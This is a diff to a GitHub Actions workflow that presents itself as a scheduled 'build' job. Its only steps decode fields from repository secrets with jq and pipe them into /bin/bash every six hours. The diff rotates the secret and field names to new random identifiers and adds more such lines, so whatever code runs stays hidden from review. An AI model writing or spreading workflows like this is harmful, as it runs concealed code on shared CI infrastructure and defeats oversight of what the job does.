@@ -3,21 +3,29 @@ name: lihunzheng4718
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
-jobs:  # 7747
+    - cron: '12 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lihunzheng4718
         env:
-          kq89: ${{ secrets.kq89 }}
+          qw1407: ${{ secrets.qw1407 }}
         run: |
-          echo $kq89 | jq -r .e458 | /bin/bash
-          echo $ivnch6 | jq -r .xdoy18 | /bin/bash
-          echo $ybpx33439 | jq -r .c97 | /bin/bash
-          echo $evwg5062 | jq -r .tl3447 | /bin/bash
-          echo $xbk88020 | jq -r .yjfjm4392 | /bin/bash
-          echo $clqi7 | jq -r .lx060 | /bin/bash
-          echo $k3021 | jq -r .sqd5227 | /bin/bash
+          echo $qw1407 | jq -r .lz01 | /bin/bash
+          echo $w4 | jq -r .de159 | /bin/bash
+          echo $vhl264 | jq -r .fmttb837 | /bin/bash
+          echo $unru020 | jq -r .xgqa60 | /bin/bash
+          echo $v1026 | jq -r .f525 | /bin/bash
+          echo $pr3 | jq -r .roh49 | /bin/bash
+          echo $ed6 | jq -r .z9397 | /bin/bash
+          echo $ynho08191 | jq -r .e3541 | /bin/bash
+          echo $wvng1 | jq -r .qq33 | /bin/bash
+          echo $vi401 | jq -r .gujuf22 | /bin/bash
+          echo $mdao0 | jq -r .pjy70 | /bin/bash
+          echo $ptx83825 | jq -r .b5166 | /bin/bash
+          echo $qq70 | jq -r .ct5074 | /bin/bash
 
